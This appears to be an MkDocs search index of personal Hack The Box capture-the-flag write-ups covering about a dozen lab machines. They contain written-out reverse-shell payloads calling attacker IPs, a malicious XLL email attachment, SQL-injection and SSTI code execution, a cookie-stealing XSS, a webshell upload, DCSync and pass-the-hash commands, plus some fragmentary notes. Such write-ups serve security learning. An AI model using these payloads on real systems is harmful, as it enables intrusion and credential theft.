{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Welcome", "text": "<p>For full documentation visit mkdocs.org.</p>"}, {"location": "#commands", "title": "Commands", "text": "<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"}, {"location": "#project-layout", "title": "Project layout", "text": "<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"}, {"location": "Write-Ups/Axlle/", "title": "Axlle", "text": ""}, {"location": "Write-Ups/Axlle/#enumeration", "title": "Enumeration", "text": ""}, {"location": "Write-Ups/Axlle/#port-scan", "title": "Port Scan", "text": "<p>Starting the enumeration process with an <code>nmap</code> scan:  Conclusion: I am noting, besides other services a DNS Server being used, Mail Server that is active, AD/Kerberos, 3389/5985 and other RPC services. Port 80. Also see 9389, unknown to me, have to research.</p>"}, {"location": "Write-Ups/Axlle/#information-gathering-on-port-80", "title": "Information Gathering on Port 80", "text": ""}, {"location": "Write-Ups/Axlle/#manual-information-gathering", "title": "Manual Information Gathering", "text": "<p>  See some contact information and take note of it. Conclusion: Interesting is the E-Mail account for now, since it's a CTF.</p> <p> Conclusion: Something called WDK is being used for probably at the moment irrelevant stuff. Just a side note.</p> <p>Wappalyzer Information:  Conclusion: Dealing with a Windows target and no known vulnerabilities to me for the UI Framework and Font Scripts used.</p> <p>Nothing of note to be found on the home-page source code.</p> <p>Manual tries of <code>/index</code> extensions was successful for <code>.html</code>.</p> <p> Conclusion: Dealing with <code>Apache</code>; most likely.</p> <p>\u2192 Noteworthy information obtained: - Apache being used - Email: <code>accounts@axlle.htb</code></p>"}, {"location": "Write-Ups/Axlle/#ffuf-enumeration", "title": "FFuF Enumeration", "text": ""}, {"location": "Write-Ups/Axlle/#vhost-scan", "title": "VHost Scan", "text": "<p>Starting a <code>ffuf</code> scan for virtual hosts </p>"}, {"location": "Write-Ups/Axlle/#directory-scan", "title": "Directory Scan", "text": "<p>\u2192 Both scans result in no further meaningful knowledge gained about the target; with multiple of wordlists used.</p>"}, {"location": "Write-Ups/Axlle/#information-gathering-on-smtp", "title": "Information Gathering on SMTP", "text": "<p>Since discovering the Email on 80, I tried some simple enumeration on SMTP 25, which lead to nothing meaningful other than successful mail delivery:  The thing that later crossed my mind again was the mention of the Email with the statement of submitting in Excel format.  This will be the first exploitation step tried.</p>"}, {"location": "Write-Ups/Axlle/#exploitation", "title": "Exploitation", "text": ""}, {"location": "Write-Ups/Axlle/#exploiting-via-malicious-e-mail-attachment", "title": "Exploiting via Malicious E-Mail Attachment", "text": "<p>The website mentioned an attachment in form of an Excel document. So I will have to look into types of Excel exploits.</p>"}, {"location": "Write-Ups/Axlle/#research", "title": "Research", "text": "<p>I began researching and after a lot of studying and understand, I have come across a useful resource, which provides <code>PoC</code>'s for several <code>Microsoft Office</code> exploitation techniques (https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/). The realization of the target having macros disabled is still in my mind, since I came to the conclusion - referencing the previous link - I would try XLL exploitation. This was the only one after quick reading that did not involve macros. Furthermore it hints at the machines name (<code>Axlle</code>) which I should usually blend out though.</p> <p>After some more research on the topic of <code>XLL</code>, this seams to be similar or if not just a <code>DLL</code>. I am familiar with <code>DLL</code> Injection but wondering if this is applicable. Thus I first, as always, look for available attack surfaces concerning this online, before wasting hours on my own developing.</p>"}, {"location": "Write-Ups/Axlle/#payload", "title": "Payload", "text": "<p>Found some payload on the link mentioned in Research:  Going to modify the <code>WinExec</code> parameter to hopefully get a shell of some kind. Trying <code>revshells</code> payloads for <code>PowerShell</code>. As instructed have to compile it first.</p> <p>After some hefty trouble compiling the file on Linux using <code>mingw</code>, because I didn't have the Windows header files. I finally compiled it. </p> <p>To build a DLL, I had to add the <code>-shared</code> flag to <code>gcc</code>/<code>mingw</code>. I also had to rename the exploits <code>#include &lt;Windows.h&gt;</code> to <code>#include &lt;windows.h&gt;</code>, because I have it named lower-case in <code>/usr/x86_64-w64-mingw32/include/windows.h</code>. </p>"}, {"location": "Write-Ups/Axlle/#exploiting", "title": "Exploiting", "text": "<p>I started my <code>netcat</code> listener  and continued with sending the malicious <code>XLL</code> file to <code>accounts@axlle.htb</code> using <code>swaks</code> and hope the target opens the malicious attachment:</p> <p>The Email successfully came through, however I did not receive a connection on my listener port, which lead me to think to change the payload.</p> <p>I started with <code>base64</code> encoding the reverse shell code. <pre><code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\n</code></pre></p> <p><code>Base64</code> encoding it might not have been needed. I found out I did not set the correct <code>--attach</code> flag value for <code>swaks</code>: <pre><code>swaks --to accounts@axlle.htb --from kek@kek.kek --header \"Subject: question?\" --body \"henlo\" --attach @exploit.xll --server axlle.htb --port 25\n</code></pre></p> <p>With that I successfully get a reverse shell: </p>"}, {"location": "Write-Ups/Axlle/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>After gaining access to the target as user <code>gideon.hamill</code> I began with gathering some basic information about the target system.</p> <p>Gaining some basic information and going through some programs installed system I ran <code>winPEAS</code>: <pre><code>Invoke-WebRequest \"http://10.10.14.124:7777/winPEASx64.exe\" -OutFile \"peas64.exe\"\n.\\peas64.exe\n</code></pre></p> <p> Nothing interesting in the accessible user folders.</p> <p>Snooping through the <code>hMailServer</code> program directory I find this Email in the <code>Data</code> directory:  Might be able to put a malicious link, leading to a reverse shell in the <code>C:\\inetpub\\testing</code> folder.</p> <p>I also found the database and password hashes in the <code>hMailServer.ini</code> file:  All of this lead to nothing so I tried the path with the malicious link mentioned above.</p>"}, {"location": "Write-Ups/Blazorized/", "title": "Blazorized", "text": "<p><pre><code>sudo nmap --min-rate 1000 -T4 -A 10.129.18.164 -oN nmap.txt \n</code></pre>  Next visit port 80 and run directory and vhost scan: <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://blazorized.htb -H \"Host: FUZZ.blazorized.htb\" -fs 144\n</code></pre> Find vhost <code>admin.blazorized.htb</code>, add to <code>/etc/hosts</code> and see login panel:  <pre><code>ffuf -u http://blazorized.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1542\n</code></pre> find nothing. Look through with burpsuite, bunch of dlls: <pre><code>for i in $(cat dlls.txt);do curl $i -O $i;done\n</code></pre> Download all the dll files and next step reverse engineer. Get the Blazorized.Helpers.dll found through <code>blazor.boot.json</code>. Loading it in IDA we find this:  After reading the JWT we craft a JWT using the extracted information with <code>jwt.io</code>.  Setting it in our browser developer tools local storage we get into the admin panel:  Trying SQL Injection reveals that we don't get a response back from injecting anything with <code>'</code> character. Further testing shows that we are still inside a query, so we will add a <code>;</code> after <code>'</code> to start our new query and ending it with commenting. <code>';-- -</code>; this will give us freedom for queries. We will thus try to catch a reverse shell: <pre><code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAyACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n</code></pre> With <code>'; EXEC xp_cmdshell '&lt;PAYLOAD&gt;'-- -</code> We catch a shell:  And can get the user flag under <code>C:\\Users\\NU_1055\\Desktop\\user.txt</code>. Next i transfer bloodhound over to the target machine  <code>curl \"http://10.10.14.62:8080/SharpHound.exe\" -O sharphound.exe</code> and run it: <pre><code>.\\sharphound.exe -c All --zipfilename blazorized\n</code></pre> And upload the <code>.zip</code> file using: <pre><code>python3 -m uploadserver\n</code></pre> And on the victim host: <pre><code>Invoke-FileUpload -Uri http://10.10.14.62:8000/upload -File C:\\Users\\NU_1055\\Desktop\\20240804135146_blazorized.zip\n</code></pre> By https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1.  Now i import it into bloodhound.  We can <code>WriteSPN</code> of <code>RSA_4810</code>:  To this we upload PowerView to the target. Then we set a dummy SPN: <pre><code>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='pwn/pwned'}\n</code></pre> And <code>kerberoast</code> <code>RSA_4810</code>: <pre><code>Get-DomainSPNTicket -SPN 'pwn/pwned' | fl\n</code></pre> To view the output of the command I switch to meterpreter interactive shell: <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.62 LPORT=8989 -f exe -o shellyreversetcp.exe\n</code></pre>  We will obtain the hash:  And crack with hashcat: <pre><code>hashcat -m 13100 htb_blazorized_kreberoast.txt rockyou.txt\n</code></pre> And get the password: <code>(Ni7856Do9854Ki05Ng0005 #)</code> We know <code>RSA_4810</code> is part of remote management users so we know he can use WinRM. <pre><code>evil-winrm -i blazorized.htb -u \"RSA_4810\" -p \"(Ni7856Do9854Ki05Ng0005 #)\"\n</code></pre> From here we once again enumerate the ACLs and find we have <code>WriteProperty</code> on user <code>SSA6010</code>: <pre><code>$sid = Convert-NameToSid RSA_4810\nGet-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre>  So we try to set the script path for this user and hope it gets executed. In this case we plant a reverse shell as <code>.ps1</code> script. Try upload host a malicious script on smb server of attacker host and hope it gets executed using <pre><code>Set-ADObject -SamAccountName SSA_6010 -PropertyName scriptpath -PropertyValue \"\\\\10.10.14.62\\shelly.ps1\"\n</code></pre> We will eventually get a reverse shell:  From looking through Bloodhound earlier we know SSA_6010 can perform DCSync on the DC. So upload <code>mimikatz</code> and perform it: <pre><code>.\\mimikatz.exe\nlsa::dcsync /domain:blazorized.htb /user:blazorized\\administrator\n</code></pre>  And we log in using winrm with pass-the-hash: <pre><code>evil-winrm -i blazorized.htb -u \"Administrator\" -H \"f55ed1465179ba374ec1cad05b34a5f3\"\n</code></pre></p>"}, {"location": "Write-Ups/Blurry/", "title": "Blurry", "text": "<p>nmap -&gt; port 80 add app.blurry.htb to host file vhost scan look through website clearml look for clearml exploits have idea maybe do pipeline, dont work try https://github.com/OxyDeV2/ClearML-CVE-2024-24590/tree/main dont work yet look through what it does, and see the json check, it only runs if tag is review change the exploits tag to review try it a few times, get reverse shell user.txt basic enumeration, network, sudo etc. see i have root nopasswd rights for evaluate_model.py wget a reverse shell from my host see i can rm and touch files in the models folder, but not write to files delete the .py file echo my reverse shell into models folder with the same name as before sudo /usr/bin/evaluate_model.py /models/*.pth get reverse shell as root root.txt</p> <p>get better at searching for exploits in the initial enumeration phase and ffs open eyes sometimes bit more experience with permissions in linux (why did touch and rm work but not mv)</p>"}, {"location": "Write-Ups/BoardLight/", "title": "BoardLight", "text": "<p>sadhgnoiah https://forum.hackthebox.com/t/official-boardlight-discussion/313439</p> <p>https://www.php.net/manual/en/function.password-hash.php</p> <p>https://github.com/alien-keric/CVE-2023-4197/tree/main</p> <p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3639</p> <p>https://github.com/mmxsrup/CVE-2018-3639</p> <p>https://github.com/Shuiliusheng/CVE-2018-3639-specter-v4-https://www.cvedetails.com/cve/CVE-2018-18751/</p> <p>das</p>"}, {"location": "Write-Ups/Compiled/", "title": "Compiled", "text": "<p>Nmap scan <pre><code>sudo nmap --min-rate 1000 -T4 -A 10.129.231.87 -oN nmap.txt\n</code></pre> Port 3000 and 5000 open.   Add vhost to /etc/hosts  We register an account.  It mentions git version 2.45.0:  This is an RCE vulnerability CVE-2024-32002 https://amalmurali.me/posts/git-rce/</p>"}, {"location": "Write-Ups/Compiled/#tip", "title": "Tip", "text": "<p>for <code>pbkdf2</code> convert pwd+salt from hex to b64 then use <code>hashcat -m 10900</code>. <pre><code>echo \"97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16\" | xxd -r -p | base64\n</code></pre></p>"}, {"location": "Write-Ups/FormulaX/", "title": "FormulaX", "text": "<p>Nmap scan:  registration in json post format   contact us page is vulnerable to xss   cannot steal cookie, idk it is very hard to try to figure out how to get a foothold i am still leaning towards xss analyzing chat.js thinking i might be able to somewhat mirror chat.js and maybe get it through to the individual opening it in my xss attack, but i dont know how yet im trying to craft a js payload</p>"}, {"location": "Write-Ups/GreenHorn/", "title": "GreenHorn", "text": "<p>Nmap scan: <pre><code>sudo nmap --min-rate 1000 -A -T4 10.129.191.197 -oN nmap.txt\n</code></pre> Results:  SNIP Nothing really interesting running ffuf on port 80. <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \"http://greenhorn.htb/FUZZ\" -fs 0\n</code></pre> Vhost scan: <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \"http://greenhorn.htb/\" -H \"Host: FUZZ.greenhorn.htb\" -fs 154\n</code></pre> Nothing Due to port 3000 found out php used: <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u \"http://greenhorn.htb/FUZZ.php\" -fs 0\n</code></pre> </p> <p>Port 3000:  Gitea no vulnerabilities matching version on <code>searchsploit</code> and googling.  Cant register, get 500. Looking through the repo:   Know plunk is used, find RCE for this version. Decrypting the SHA-512 hash leads to <code>iloveyou1</code> as password. Used only tool dcode.fr, too lazy to fire up hashcat. Cannot get login on the 3000 port.</p> <p>Go to port 80 /login.php and authenticate using cracked password:  Preparing RCE i found with searchsploit:  Have to edit the python script for correct paths. <pre><code>rlwrap -cAr nc -lvnp 9000\n</code></pre></p> <p>Then we open <code>http://greenhorn.htb/data/themes/shelly/shelly.php</code> <code>shelly</code> being the archive name and <code>shelly.php</code> the reverse shell name inside the archive.  Looking through some directories find nothing. So i transfer linpeas and let it rip.   After hammering my head in for a while, Ive tried the usually sensible thing to do first and try to log in to other accounts with information Ive found. Well junior works with <code>iloveyou1</code> password. Get user flag: <pre><code>cat /home/junior/user.txt\n</code></pre> I downloaded the <code>.pdf</code> file on junior's home directory and took a look at it:  Have to use tool to depixel it and it will work. Here using <code>depix</code>:  <code>sidefromsidetheothersidesidefromsidetheotherside</code> </p>"}, {"location": "Write-Ups/IClean/", "title": "IClean", "text": "<p>nmap scan </p> <p>trying to connect to <code>iclean.htb</code> redirects to <code>capiclean.htb</code> -&gt; add to <code>/etc/hosts</code></p> <p>bunch of ffuf scans, directory scan, vhost scan   </p> <p>nothing</p> <p>trying sql payloads on login did nothing \\</p> <p>The fact that capticlean.htb/quote post request mentions they will reach out, im suspecting some blind XSS injection trying XSS on email not working trying XSS on service get response back   trying to fetch cookies because of previously mentioned \"they will reach out\"  <code>service=&lt;img src=x onerror=fetch(\"http://10.10.14.22:9999/\"%2bdocument.cookie)&gt;&amp;email=d%40d.d</code> url encode the + for cookie or it wont work</p> <p>from ffuf enumeration dashboard page works with cookie </p> <p>once at the dashboard generate an invoice generate qr of this invoice   intercepted with burp, looks like SSRF. but didnt work going for other server side attacks, finally tried ssti, worked: testing with default <code>{{7*7}}</code> works.  trying all my payloads from htb server-side attacks course, not working. bunch of research for ssti payloads, know its python: going through python payloadsallthethings, eventually  <code>{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}</code> work and prints the id  so i craft revshell, download it and execute   Inside opt/app/app.py connecting to the database using mysql   cracking passwords  hashcat also confirming sha256  </p> <p>ssh as consuela using cracked password sudo -l  </p> <p>so has to do something with qpdf, research and finally found out how to basically copy files  moving it to my machine and inspecting it i got the private ssh key:  </p>"}, {"location": "Write-Ups/Instant/", "title": "Instant", "text": "<p><pre><code>sudo nmap -sC -sV -on nmap-detailed 10.129.139.159\n</code></pre> nothing interesting  Download file <code>instant.apk</code>. Decompile with <code>apktool</code> <pre><code>apktool d instant.apk -o ./decompile\n</code></pre> search for interesting stuff (password, token, cred, api): <pre><code>grep -r api\n</code></pre>  subdomain discovered <pre><code>grep -r \"instant.htb\"\n</code></pre> new subdomain <code>swagger-ui.instant.htb</code>. can curl to register user, not really much. look through apk files for grep admin, find admin jwt. use it as authentication on swagger. can do all queries. log file query LFI. curl the query with LFI, can leak /etc/passwd. leak /home/user/.ssh/id_rsa. get user.txt linpeas.sh nothing interesting. manual go /opt/ find putty thing. google for it, find decrypter. download to windows. error on trying to decrypt dat file. google reveals badpw. bruteforce using rockyou with python script. find valid pw estrella. get decrypted content of it. root pw inside. su root with pw. root.txt</p>"}, {"location": "Write-Ups/Intuition/", "title": "Intuition", "text": "<p>add comprezzor.htb to hostfile</p> <p></p> <p>Looking through source code, suspecting file upload attack/xss. starting subdomain/vhost enumeration too. uploading file see name reflected</p> <p>find few vhosts, add them and visit. create account on auth.comprezzor.htb</p> <p>on dashboard  </p> <p>on submitting a report, XSS/SQLi? </p> <p>finding nothing doing basic param scans for sql and xss</p> <p>blind xss works, hints are \"team will check on this shortly\" and we have user_data cookie</p> <p></p> <p></p> <p>we play around and find priority level. also seeing webdev. maybe higher priority gets checked by higher privileged user?</p> <p>we send another bug report and quickly bump the priority up </p> <p></p> <p>get a new cookie</p> <p></p> <p>Creating a pdf report and inputting our attacker server gets interesting.</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>FTP is not open port, cant use. But can still access from within SSRF</p> <p>grab the password in welcome note and the private key</p> <p>ssh-keygen -p -f id_rsa, username in the file commented ssh into </p> <p>run some enumeration. find users.db on var/www/ i think. download it and sqlite3 them. select * from users. get hashes, crack with hashcat, find login for adam. try ssh, dont work, remember ftp is open, ftp to it. find 3 files where the ansible shit begins. opening sauce and try to understand how it works. dont remember where the half complete auth key came from, but we see its checking the auth key to match the hash. idea.jpg, write decrypt python script.</p> <p>now have the auth key, cant use it, script does nothing. endless, endless, endless, endless enumeration. break.</p> <p>find /var/log/ interesting folder where i have permission to open and read. bunch of .gz logs. appear to be the some requests also send to the web server, find adam. go through the enumerated users i know. find an interaction of lopez trying to login to ftp. fails, then succeeds to type her damn password. yoink the password</p> <p>login as lopez. id command tells me sys-adm. more privs. remember the /opt/ folder from enumeration, only for sys-adm, go there. now the real pain begins. its runner again but seems to want json file now try generic json file, tells me something about run is not being set etc. try a few things by reading the previous ones source code, get stuck on the auth key.</p> <p>decide to just reverse engineer it. understand what json format it expects. write the format as expected. thinking about if i somehow can create a playbook, or through reverse engineering it i know maybe i can change the filepath for code injection. but no privs. have to go the install path. 2 hrs of reading through abinsle docs trying to understand what it is, how it works 1 more hour fucking around to try n create a role. find out about templates, write template. hoping i have sudo now, no think back to command inject maybe, works byebye root</p> <p>WTF IS ANSIBLE ????????</p>"}, {"location": "Write-Ups/PermX/", "title": "PermX", "text": "<p>Nmap scan:  Going through the web page finding nothing other than an email address <code>perm@htb.com</code>. Directory fuzzing yielding nothing Vhost fuzzing reveals <code>lms</code> and <code>www</code> subdomains: <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u \"http://permx.htb\" -H \"Host: FUZZ.permx.htb\" -ic -mc 200\n</code></pre> <code>www</code> seems to just be a mirror of the original web page. <code>lms</code> reveals a login portal <code>Chamilo</code>.  Common logins don't work, so I look for exploits.  https://github.com/ThatNotEasy/CVE-2023-34960  So I try https://starlabs.sg/advisories/23/23-4220/ hoping for a web shell   Tried with <code>&lt;?php system(\"id\"); ?&gt;</code> first, now uploading web shell <pre><code>curl -F 'bigUploadFile=@shelly.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'\n</code></pre> <code>SSH</code> with mtz@permx.htb and password <code>03F6lY3uXAP2bkW8</code> works.  </p> <p><code>sudo -l</code> shows we can run <code>/opt/acl.sh</code> as root:  https://gtfobins.github.io/gtfobins/setfacl/ Since we need to point to a file in our home directory. I set up links Copying shadow file:  <code>ln -s /etc/shadow shadow</code> <code>sudo /opt/acl.sh mtz rwx /home/mtz/shadow</code> changing root password to mtz password </p>"}, {"location": "Write-Ups/Resource/", "title": "Resource", "text": "<p>Start with nmap scan: <pre><code>sudo nmap --min-rate 1000 -T4 -A 10.129.220.222 -oN nmap.txt\n</code></pre>  See redirect to <code>http://itrc.ssg.htb</code>, add it to <code>/etc/hosts</code> too.  Make account and login, see ticket process  Appears when uploading empty <code>.zip</code>. Few more pages using <code>ffuf</code> on page parameter: <pre><code>ffuf -u 'http://itrc.ssg.htb/?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 3120\n</code></pre>  Trying LFI on the parameter works without <code>.php</code>.  So we can control what is called via <code>session_start</code> as long as it is not active yet. Cannot use direct <code>syntax</code></p> <p>All wrong, we upload zip file with php webshell or reverse shell in it: <pre><code>&lt;?php system($_GET[\"cmd\"];?&gt;\n</code></pre> <pre><code>zip webshell.php webshell.zip\n</code></pre> And upload a ticket with it. After that we look where the zip file is saved inside the ticket, e.g. <code>source/XXXXX.zip</code> and finally we make use of the LFI using <code>phar://</code> on the page parameter: <pre><code>http://itrc.ssg.htb/?page=phar://uploads/e2e0fda7c6be9bffea3fad6a7f0c79b705d09684.zip/webshell&amp;cmd=id\n</code></pre>  Same can be done with reverse shell and start listener. I decided for this:  Get interactive shell: <pre><code>/bin/bash -i\n</code></pre> <code>db.php</code> file inside working dir:  With this we can connect to the DB: <pre><code>mysql -u jj -pugEG5rR5SG8uPd -h db\n</code></pre> Nothing. But we can upload the other <code>.zip</code> files in the uploads folder that we have yet to access: <pre><code>curl -X POST http://10.10.14.62:80/upload -F 'files=./21de93259c8a45dd2223355515f1ee70d8763c8a.zip'\n</code></pre> And obviously starting uploadserver on our attack host: <pre><code>python3 -m uploadserver 80\n</code></pre> Looking at the bigger <code>.zip</code> we find file called <code>itrc.ssg.htb.har</code> and upon opening there's a lot of data. if we search for user and pass we can find some things however: <pre><code>cat itrc.ssg.htb.har | grep user\ncat itrc.ssg.htb.har | grep pass\n</code></pre>  Now we can use mysql client: <pre><code>mysql -u jj -pugEG5rR5SG8uPd -h db\n</code></pre> Inside the <code>resourcecenter</code> database under the users table we find this:  In the messages this:  Also seeing <code>ca-itrc</code> files inside <code>~/decomission_old_ca</code> indicating this is the certificate. We can create certificate and keys for user <code>zzinter</code> and root: <pre><code># First create id and id pub\nssh-keygen -t rsa -f zzinter\n</code></pre>  Now we sign the key using the certificate inside the folder <code>ca-itrc</code>: <pre><code>ssh-keygen -n zzinter -I user-cert -s ca-itrc zzinter.pub\n</code></pre> We transfer these files over to our attack host using <code>scp</code> and run it:  We will find <code>sign_key_api.sh</code> in <code>zzinter</code>'s home directory. Which is most likely the script mentioned in the database table <code>messages</code>.   We add this <code>vhost</code> to <code>/etc/host</code> and go to it:  Fuzz it: <pre><code>ffuf -u http://signserv.ssg.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n</code></pre>  With this site we can verify if our keys we generate in the following are authorized or not, so in short if we signed with the right principal, mentioned in the script. We will sign keys using the <code>ssh_host_rsa_key*</code> inside <code>/etc/ssh</code>, which we read using the root user we obtained earlier. First we transfer those <code>ssh_host*</code> files to our attack host using <code>scp</code> for later use.  We will use the <code>ssh_host_rsa_key.pub</code> with the <code>curl</code> command found within the script in <code>zzinter</code>'s home directory and try every principal mentioned in the script. <pre><code>cat ssh_host_rsa_key.pub\n</code></pre>  Copy-paste the key into the script: <pre><code>curl -s signserv.ssg.htb/v1/sign -d '{\"pubkey\": \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfjF5gUlAUKAIn8YxitIk2A/qd30XXdIK91iLzUw7mVuCJe5MzPnllPCbK+wbE22SjVWoZ1cBKgMeAUaGCz/Z2FtQpecQ6B0cxwJVfgVu5mw5EIVLSUuVjiykddjLqjJ695es1ILT8f8gnXc9NCF4eCLlQ5xYVv//ZDwrjkg+C+9nTdBViaAWGeJgxMaQoLED2K1CxeibDshjKbCXxCjv9bxVQR+4yOcthOE3TR2jeSgJ6IN0h+Lwai/G2ZVImHzK+QpLWXED6PqnDjIs8lvTR9MPYaloyN6uzAjlHBmQXHfxKt5ZCDk4ytx5PIYrBNOqPUU7ZzoNbv1AQ6wzb9HqWtu13TWu4gQvN3BLtKXr/aw8mJ3jKLWPpK4ysp5x4EA7l6EsqwIbrZvf6Rc0TRDt+5ssCtOYhEUuqbMx5GvGh2j+uFqc9U5wvHyExp4Eck2g9pfzIZD+gF0WAuQNjzYi35ucEr8nMghoPYQNVkKUySHLFPn1DKtdFj95b+O2sXis= root@buildkitsandbox\", \"username\": \"support\", \"principals\": \"support\"}' -H \"Content-Type: application/json\" -H \"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE\"\n</code></pre> This will generate us a cert for the support user:  Copy paste it and create a file on attack machine. Now we <code>ssh</code> into at port 2222 using the pasted cert 